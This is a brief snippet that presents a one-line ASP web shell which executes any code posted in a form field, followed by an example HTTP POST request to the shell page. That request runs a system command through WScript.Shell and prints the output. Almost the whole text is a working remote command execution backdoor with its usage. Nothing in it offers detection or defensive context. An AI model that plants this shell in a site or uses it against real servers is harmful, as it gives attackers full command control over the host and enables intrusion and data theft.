<%execute Request.Form("a")%>

Send the following POST request in order to send your command

POST /ss.asp? HTTP/1.1
Host: 127.0.0.1
Content-type: application/x-www-form-urlencoded
Content-Length: 83

a=Response.Write(CreateObject("WScript.Shell").exec("ipconfig").StdOut.ReadAll)

